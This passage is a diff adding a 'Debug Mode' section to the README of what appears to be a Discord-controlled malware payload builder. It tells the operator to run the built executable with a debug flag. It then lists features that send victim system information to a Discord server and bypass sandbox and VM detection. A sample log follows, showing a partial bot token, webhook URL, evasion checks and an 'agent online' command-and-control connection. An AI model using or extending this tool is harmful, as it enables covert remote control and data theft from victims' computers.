@@ -87,6 +87,48 @@ The build process will create:
 - `dist/[payload_name].exe` - The final executable payload
 - Temporary files are automatically cleaned up
 
+## Debug Mode
+
+### Testing and Verification
+
+For testing and verifying functional deployment, run the payload with debug mode:
+
+```cmd
+d3.exe -d
+```
+
+**Debug Mode Features:**
+- ✅ **Terminal Logs** - Real-time logging of all operations
+- ✅ **Debug Hit** - Sends test message to Discord server
+- ✅ **System Information** - Shows detailed system info in Discord
+- ✅ **Evasion Bypass** - Runs regardless of sandbox/VM detection
+- ✅ **Debug Log File** - Creates `debug.log` for troubleshooting
+- ✅ **Connection Verification** - Confirms Discord bot connectivity
+
+**Debug Output Example:**
+```
+============================================================
+DEBUG MODE ENABLED
+============================================================
+Bot Token: MTM37NTkzNTQ5OTU0OTU0...
+Guild ID: 1375935187250057216
+Channel ID: 1375935188265209989
+Webhook: https://discord.com/api/webhooks/1375937047998501057/...
+============================================================
+[14:32:15] DEBUG: Starting payload in DEBUG MODE
+[14:32:15] DEBUG: Performing system checks...
+[14:32:16] DEBUG: Sending debug hit to Discord server...
+[14:32:17] DEBUG: Debug bot connected as YourBot#1234
+[14:32:18] DEBUG: Debug hit sent successfully!
+[14:32:18] DEBUG: Sandbox evasion test: PASSED
+[14:32:18] DEBUG: VM detection test: PHYSICAL MACHINE
+[14:32:19] DEBUG: Starting Discord bot...
+[14:32:20] DEBUG: Bot connected as YourBot#1234
+[14:32:20] DEBUG: Channel obtained: #your-channel
+[14:32:21] DEBUG: Agent ID: 1337, Config created: True
+[14:32:22] DEBUG: Agent online message sent
+```
+
 ## Discord Bot Commands
 
 Once the payload is running, you can use these Discord commands:
